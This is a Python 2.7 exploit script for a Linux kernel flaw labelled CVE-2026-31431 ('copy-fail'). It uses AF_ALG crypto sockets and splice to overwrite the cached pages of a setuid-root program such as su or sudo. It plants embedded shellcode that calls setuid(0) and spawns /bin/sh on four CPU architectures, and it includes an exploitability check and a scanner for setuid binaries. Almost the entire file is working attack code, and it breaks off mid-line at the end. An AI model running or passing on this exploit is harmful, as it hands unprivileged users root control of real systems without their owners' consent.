#!/usr/bin/env python2
# CVE-2026-31431 (copy-fail) — Python implementation (Python 2.7 port)
# Requires: Python 2.7, Linux kernel with AF_ALG + authencesn support
# The Python 3 original relies on socket.AF_ALG + socket.sendmsg (3.6+) and
# os.splice (3.12+).  This port provides ctypes-based AF_ALG bind()/sendmsg()
# and a NULL-buffer setsockopt() so it runs on stock Python 2.7.
# Supported architectures: x86_64, i386/i686, armv6l/armv7l, aarch64.  macOS is NOT supported.
# See https://copy.fail for more information.

from __future__ import print_function

import ctypes
import logging
import os
import platform
import socket
import stat
import struct
import sys
import zlib

logging.basicConfig(format="%(message)s", level=logging.INFO)

SOL_ALG               = 279
ALG_SET_KEY           = 1
ALG_SET_IV            = 2
ALG_SET_OP            = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5

# Python 2.7's socket module predates AF_ALG (added in 3.6) and sendmsg (3.3).
# Supply the missing constants ourselves; SOCK_SEQPACKET/MSG_MORE fallbacks are
# harmless if the running 2.x build already defines them.
AF_ALG         = getattr(socket, "AF_ALG", 38)          # Linux AF_ALG == 38
SOCK_SEQPACKET = getattr(socket, "SOCK_SEQPACKET", 5)
MSG_MORE       = getattr(socket, "MSG_MORE", 0x8000)

# Setuid-root binaries to try, in preference order.
# The first one that exists and has the setuid-root bit set will be used.
_SUID_TARGETS = [
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/passwd",
    "/usr/bin/newgrp",
    "/usr/bin/chsh",
    "/usr/bin/chfn",
    "/usr/bin/sudo",
]

_libc = ctypes.CDLL(None, use_errno=True)


def _fromhex(h):
    """bytes.fromhex() equivalent for Python 2.7 (str.decode('hex'))."""
    return h.decode("hex")


# os.splice is 3.12+; Python 2 always takes the libc fallback.  Kept so the
# structure matches the original if this file is ever re-run under 3.12+.
if hasattr(os, "splice"):
    def _splice(fd_in, fd_out, count, offset_src=None):
        kw = {} if offset_src is None else {"offset_src": offset_src}
        os.splice(fd_in, fd_out, count, **kw)
else:
    _libc.splice.argtypes = [
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
        ctypes.c_size_t, ctypes.c_uint,
    ]
    _libc.splice.restype = ctypes.c_ssize_t

    def _splice(fd_in, fd_out, count, offset_src=None):
        off = ctypes.c_int64(offset_src) if offset_src is not None else None
        off_ref = ctypes.byref(off) if off is not None else None
        _libc.splice(fd_in, off_ref, fd_out, None, count, 0)


# --- ctypes replacements for Python-3-only socket features -----------------

def _alg_bind(sock, alg_type, alg_name):
    """AF_ALG bind(): build struct sockaddr_alg and call libc.bind().

    Python 2 has no AF_ALG support in its socket module, so a tuple bind()
    would fail with "getsockaddrarg: bad family".  struct sockaddr_alg is
    2 + 14 + 4 + 4 + 64 = 88 bytes on all Linux ABIs.
    """
    sa = struct.pack("=H14sII64s", AF_ALG, alg_type, 0, 0, alg_name)
    buf = ctypes.create_string_buffer(sa, len(sa))
    if _libc.bind(sock.fileno(), ctypes.cast(buf, ctypes.c_void_p), len(sa)) != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


def _setsockopt_null(fd, level, optname, optlen):
    """setsockopt(fd, level, optname, NULL, optlen).

    Python 2 lacks the (value=None, optlen=...) form of setsockopt that the
    Python 3 original uses for ALG_SET_AEAD_AUTHSIZE (kernel reads optlen,
    not the buffer).  This passes a true NULL + optlen via libc.
    """
    if _libc.setsockopt(fd, level, optname, None, optlen) != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


class _iovec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_size_t),
    ]


class _msghdr(ctypes.Structure):
    _fields_ = [
        ("msg_name", ctypes.c_void_p),
        ("msg_namelen", ctypes.c_uint),
        ("msg_iov", ctypes.POINTER(_iovec)),
        ("msg_iovlen", ctypes.c_size_t),
        ("msg_control", ctypes.c_void_p),
        ("msg_controllen", ctypes.c_size_t),
        ("msg_flags", ctypes.c_int),
    ]


class _cmsghdr(ctypes.Structure):
    _fields_ = [
        ("cmsg_len", ctypes.c_size_t),
        ("cmsg_level", ctypes.c_int),
        ("cmsg_type", ctypes.c_int),
    ]


_libc.bind.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
_libc.bind.restype = ctypes.c_int
_libc.setsockopt.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int,
                             ctypes.c_void_p, ctypes.c_uint]
_libc.setsockopt.restype = ctypes.c_int
_libc.sendmsg.argtypes = [ctypes.c_int, ctypes.POINTER(_msghdr), ctypes.c_uint]
_libc.sendmsg.restype = ctypes.c_ssize_t


def _cmsg_blob(level, ctype, data):
    """Serialize one control message (cmsghdr + payload) with glibc-style
    CMSG_ALIGN padding (aligned to sizeof(size_t))."""
    hdr = _cmsghdr()
    hdr.cmsg_level = level
    hdr.cmsg_type = ctype
    hdr.cmsg_len = ctypes.sizeof(_cmsghdr) + len(data)
    blob = ctypes.string_at(ctypes.byref(hdr), ctypes.sizeof(_cmsghdr)) + data
    align = ctypes.sizeof(ctypes.c_size_t)
    pad = (-len(blob)) % align
    return blob + (b"\x00" * pad)


def _sendmsg(sock, data, ancdata, flags):
    """socket.sendmsg() equivalent via libc (absent in Python 2)."""
    iov = (_iovec * 1)()
    buf = ctypes.create_string_buffer(data)
    iov[0].iov_base = ctypes.cast(buf, ctypes.c_void_p)
    iov[0].iov_len = len(data)

    msg = _msghdr()
    msg.msg_name = None
    msg.msg_namelen = 0
    msg.msg_iov = iov
    msg.msg_iovlen = 1

    control = b"".join(_cmsg_blob(l, t, d) for (l, t, d) in ancdata)
    cbuf = None
    if control:
        cbuf = ctypes.create_string_buffer(control, len(control))
        msg.msg_control = ctypes.cast(cbuf, ctypes.c_void_p)
        msg.msg_controllen = len(control)

    n = _libc.sendmsg(sock.fileno(), ctypes.byref(msg), flags)
    if n < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return n


# --- exploit core -----------------------------------------------------------

def _c(f, t, chunk):
    """Core vulnerability trigger — overwrites 4 bytes of the target file's page cache."""
    # 1. Create AF_ALG cryptographic socket
    alg = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    try:
        # 2. Bind to the vulnerable Authenticated Encryption wrapper
        _alg_bind(alg, "aead", "authencesn(hmac(sha256),cbc(aes))")

        # 3. Set dummy key; authsize passed via optlen (kernel reads len, not val)
        key = _fromhex("0800010000000010" + "00" * 32)
        alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
        _setsockopt_null(alg.fileno(), SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 4)

        # 4. Accept operational socket — AF_ALG ignores addr/addrlen
        u, _ = alg.accept()
        try:
            # 5+6. Send payload with CMSG control messages configuring encryption state
            ancdata = [
                (SOL_ALG, ALG_SET_OP,           b"\x00" * 4),            # decrypt
                (SOL_ALG, ALG_SET_IV,            b"\x10" + b"\x00" * 19), # ivlen=16, IV=zeros
                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + b"\x00" * 3),  # assoclen=8
            ]
            _sendmsg(u, b"AAAA" + chunk, ancdata, MSG_MORE)

            # 7. Create pipe
            rfd, wfd = os.pipe()
            try:
                n = t + 4
                # 8. Splice: file -> pipe, then pipe -> crypto socket
                _splice(f.fileno(), wfd, n, offset_src=0)
                _splice(rfd, u.fileno(), n)
                # 9. Read response — triggers the memory-overwrite condition
                try:
                    u.recv(8 + t)
                except OSError:
                    pass
            finally:
                os.close(rfd)
                os.close(wfd)
        finally:
            u.close()
    finally:
        alg.close()


def _get_payload():
    """Select the correct ELF payload for the host architecture."""
    # NB: Python 2 reports sys.platform as "linux2" (older kernels: "linux3"),
    # so use startswith() instead of the == "linux" check from the 3.x original.
    if not sys.platform.startswith("linux"):
        sys.exit(
            "fatal: %s is not supported — CVE-2026-31431 is a Linux "
            "kernel vulnerability (AF_ALG / splice). Run inside a Linux VM."
            % sys.platform
        )

    arch = platform.machine()

    if arch == "x86_64":
        # 160-byte ELF64 (x86_64): setuid(0) + execve(/bin/sh) + exit(1)
        # Source: https://github.com/theori-io/copy-fail-CVE-2026-31431
        return zlib.decompress(_fromhex(
            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
            "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
            "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
        ))

    if arch in ("i386", "i686"):
        # 121-byte ELF32 (i386): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=23, execve=11, exit=1  (int 0x80 ABI)
        # jmp/call trick: call pushes &"/bin/sh" onto stack; pop ebx retrieves it
        return _fromhex(
            # ELF32 header (52 bytes)
            "7f454c46"               # magic
            "010101000000000000000000"  # ELF32, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "0300"                   # e_machine = EM_386
            "01000000"               # e_version = 1
            "54800408"               # e_entry = 0x08048054  (52+32 = 84 = 0x54 bytes in)
            "34000000"               # e_phoff = 0x34 = 52
            "00000000"               # e_shoff = 0
            "00000000"               # e_flags = 0
            "3400"                   # e_ehsize = 52
            "2000"                   # e_phentsize = 32
            "0100"                   # e_phnum = 1
            "2800"                   # e_shentsize = 40
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF32 program header (32 bytes)
            "01000000"               # p_type  = PT_LOAD
            "00000000"               # p_offset = 0
            "00800408"               # p_vaddr = 0x08048000
            "00800408"               # p_paddr = 0x08048000
            "79000000"               # p_filesz = 121
            "79000000"               # p_memsz  = 121
            "05000000"               # p_flags = PF_R | PF_X
            "00100000"               # p_align = 0x1000
            # Code (37 bytes)
            "31c0"                   # xor eax, eax
            "b017"                   # mov al, 23         ; setuid syscall
            "31db"                   # xor ebx, ebx       ; uid = 0
            "cd80"                   # int 0x80
            "eb0e"                   # jmp +14            ; → call at offset 24
            "5b"                     # pop ebx            ; ebx = &"/bin/sh"
            "31c9"                   # xor ecx, ecx       ; argv = NULL
            "31d2"                   # xor edx, edx       ; envp = NULL
            "b00b"                   # mov al, 11         ; execve syscall
            "cd80"                   # int 0x80
            "31c0"                   # xor eax, eax
            "40"                     # inc eax            ; exit syscall
            "cd80"                   # int 0x80
            "e8edffffff"             # call -19           ; ← push &"/bin/sh", jmp pop
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    if arch in ("armv7l", "armv6l", "armv5l", "arm"):
        # 136-byte ELF32 (ARM32 EABI): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=23, execve=11, exit=1  (svc #0 / swi #0 EABI, same encoding)
        # Address of "/bin/sh": add r0, pc, #24
        #   ARM pipeline: pc = instr_addr + 8, so at code offset 12: pc = 20
        #   string is at code offset 44 → 44 - 20 = 24
        return _fromhex(
            # ELF32 header (52 bytes)
            "7f454c46"               # magic
            "010101000000000000000000"  # ELF32, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "2800"                   # e_machine = EM_ARM (40 = 0x28)
            "01000000"               # e_version = 1
            "54800408"               # e_entry = 0x08048054  (52+32 = 84 = 0x54 bytes in)
            "34000000"               # e_phoff = 52
            "00000000"               # e_shoff = 0
            "00000005"               # e_flags = EF_ARM_EABI_VER5 (0x05000000 in LE)
            "3400"                   # e_ehsize = 52
            "2000"                   # e_phentsize = 32
            "0100"                   # e_phnum = 1
            "2800"                   # e_shentsize = 40
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF32 program header (32 bytes)
            "01000000"               # p_type  = PT_LOAD
            "00000000"               # p_offset = 0
            "00800408"               # p_vaddr = 0x08048000
            "00800408"               # p_paddr = 0x08048000
            "88000000"               # p_filesz = 136 (52+32+52)
            "88000000"               # p_memsz  = 136
            "05000000"               # p_flags = PF_R | PF_X
            "00100000"               # p_align  = 0x1000
            # Code (44 bytes) — ARM32 EABI, all instructions 32-bit LE
            "1770a0e3"               # mov r7, #23        ; setuid syscall
            "0000a0e3"               # mov r0, #0         ; uid = 0
            "000000ef"               # svc #0
            "18008fe2"               # add r0, pc, #24    ; → "/bin/sh" (pc=20, 20+24=44)
            "0010a0e3"               # mov r1, #0         ; argv = NULL
            "0020a0e3"               # mov r2, #0         ; envp = NULL
            "0b70a0e3"               # mov r7, #11        ; execve syscall
            "000000ef"               # svc #0
            "0170a0e3"               # mov r7, #1         ; exit syscall
            "0100a0e3"               # mov r0, #1         ; code = 1
            "000000ef"               # svc #0
            # Data (8 bytes)
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    if arch == "aarch64":
        # 172-byte ELF64 (aarch64): setuid(0) + execve(/bin/sh) + exit(1)
        # Syscalls: setuid=146, execve=221, exit=93
        return _fromhex(
            # ELF64 header (64 bytes)
            "7f454c46"               # magic
            "020101000000000000000000"  # ELF64, LE, v1, OSABI_NONE + padding
            "0200"                   # e_type  = ET_EXEC
            "b700"                   # e_machine = EM_AARCH64
            "01000000"               # e_version = 1
            "7800400000000000"       # e_entry = 0x400078  (64+56 = 120 = 0x78 bytes in)
            "4000000000000000"       # e_phoff = 0x40 = 64
            "0000000000000000"       # e_shoff = 0
            "00000000"               # e_flags = 0
            "4000"                   # e_ehsize = 64
            "3800"                   # e_phentsize = 56
            "0100"                   # e_phnum = 1
            "4000"                   # e_shentsize = 64
            "0000"                   # e_shnum = 0
            "0000"                   # e_shstrndx = 0
            # ELF64 program header (56 bytes)
            "01000000"               # p_type  = PT_LOAD
            "05000000"               # p_flags = PF_R | PF_X
            "0000000000000000"       # p_offset = 0
            "0000400000000000"       # p_vaddr = 0x400000
            "0000400000000000"       # p_paddr = 0x400000
            "ac00000000000000"       # p_filesz = 172 (64+56+52)
            "ac00000000000000"       # p_memsz  = 172
            "0010000000000000"       # p_align  = 0x1000
            # Code (44 bytes) — all AArch64 instructions are 32-bit (LE)
            "481280d2"               # movz x8, #146    ; setuid syscall
            "000080d2"               # movz x0, #0      ; uid = 0
            "010000d4"               # svc  #0
            "00010010"               # adr  x0, #+32    ; → "/bin/sh" (offset 44 - 12 = 32)
            "010080d2"               # movz x1, #0      ; argv = NULL
            "020080d2"               # movz x2, #0      ; envp = NULL
            "a81b80d2"               # movz x8, #221    ; execve syscall
            "010000d4"               # svc  #0
            "a80b80d2"               # movz x8, #93     ; exit syscall
            "200080d2"               # movz x0, #1      ; code = 1
            "010000d4"               # svc  #0
            # Data (8 bytes)
            "2f62696e"               # "/bin"
            "2f736800"               # "/sh\0"
        )

    sys.exit(
        "fatal: unsupported architecture '%s' — "
        "only x86_64, i386/i686, armv6l/armv7l, and aarch64 payloads are included."
        % arch
    )


def _find_target():
    """Return the first setuid-root binary from the candidate list."""
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                return path
        except OSError:
            continue
    sys.exit(
        "fatal: no suitable setuid-root binary found.\n"
        "Searched: %s\n"
        "Tip: run with --scan to find all setuid-root binaries on this system."
        % ", ".join(_SUID_TARGETS)
    )


_SUPPORTED_ARCHS = {"x86_64", "i386", "i686", "armv5l", "armv6l", "armv7l", "arm", "aarch64"}

_SCAN_ROOTS = ["/usr", "/bin", "/sbin", "/opt", "/snap"]


def _scan_suid(roots=None):
    """Walk the filesystem and return all setuid-root binaries found."""
    found = []
    for base in (roots or _SCAN_ROOTS):
        try:
            for dirpath, _, files in os.walk(base, followlinks=False):
                for name in files:
                    path = os.path.join(dirpath, name)
                    try:
                        st = os.stat(path)
                        if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                            found.append(path)
                    except OSError:
                        continue
        except OSError:
            continue
    return sorted(found)


def _preflight():
    """
    Run pre-flight checks and print a diagnostic report.
    Returns True if the system looks exploitable, False otherwise.
    """
    arch  = platform.machine()
    ok    = True

    print("[*] Pre-flight check")
    print("    Kernel  : %s" % platform.release())
    print("    Arch    : %s" % arch)
    print("    Python  : %s" % platform.python_version())
    print("    splice  : %s" % ("os.splice (native)" if hasattr(os, 'splice') else "ctypes fallback"))

    # Already root?
    uid = os.getuid()
    if uid == 0:
        print("[!] Already running as root — nothing to do.")
        return False
    print("[+] UID     : %d  (not root)" % uid)

    # Architecture support
    if arch in _SUPPORTED_ARCHS:
        print("[+] Payload : available for %s" % arch)
    else:
        print("[-] Payload : NO payload for %s" % arch)
        ok = False

    # AF_ALG socket
    try:
        s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
        s.close()
        print("[+] AF_ALG  : socket creation OK")
    except OSError as e:
        print("[-] AF_ALG  : socket creation FAILED — %s" % e)
        ok = False

    # Required algorithm
    try:
        s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
        _alg_bind(s, "aead", "authencesn(hmac(sha256),cbc(aes))")
        s.close()
        print("[+] Algo    : authencesn(hmac(sha256),cbc(aes)) available")
    except OSError as e:
        print("[-] Algo    : authencesn FAILED — %s" % e)
        print("    Fix     : modprobe authencesn; modprobe hmac; modprobe cbc")
        ok = False

    # SUID target
    target = None
    for path in _SUID_TARGETS:
        try:
            st = os.stat(path)
            if st.st_uid == 0 and (st.st_mode & stat.S_ISUID):
                target = path
                break
        except OSError:
            continue
    if target:
        print("[+] Target  : %s  (setuid root)" % target)
    else:
        print("[-] Target  : none found in shortlist — run --scan")
        ok = False

    print()
    print("[+] System looks EXPLOITABLE" if ok else "[-] System does NOT look exploitable")
    return ok


def main():
    for arg in sys.argv[1:]:
        if arg in ("-h", "--help", "-help"):
            prog = sys.argv[0]
            print("Usage: %s [--check | --scan | -h]" % prog, file=sys.stderr)
            print("", file=sys.stderr)
            print("  (no args)   Run the exploit", file=sys.stderr)
            print("  --check     Pre-flight diagnostics (AF_ALG, algo, arch, SUID target)", file=sys.stderr)
            print("  --scan      Walk filesystem and list all setuid-root binaries", file=sys.stderr)
            print("", file=sys.stderr)
            print("Python implementation of CVE-2026-31431 (copy-fail).", file=sys.stderr)
            print("Overwrites page cache of a setuid-root binary and runs it.", file=sys.stderr)
            print("Architectures: %s" % ", ".join(sorted(_SUPPORTED_ARCHS)), file=sys.stderr)
            print("See https://copy.fail for more information.", file=sys.stderr)
            sys.exit(0)

        if arg in ("--check", "-check"):
            sys.exit(0 if _preflight() else 1)

        if arg in ("--scan", "-scan"):
            found = _scan_suid()
            print("Found %d setuid-root binary/binaries:" % len(found))
            for t in found:
                print("  %s" % t)
            sys.exit(0)

    payload = _get_payload()
    target  = _find_target()

    with open(target, "rb") as f:
        logging.info("Target:   %s  (%d-byte payload, arch=%s)",
                     target, len(payload), platform.machine())
        logging.info("Overwriting page cache...")
        for i in range(0, len(payload), 4):
            _c(f, i, payload[i:i + 4])
            if len(payload) < 10000:
                if i % 100 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
            else:
                if i % 10000 == 0:
                    logging.info("  ... wrote %d bytes", i + 4)
        logging.info("  ... wrote %d bytes total
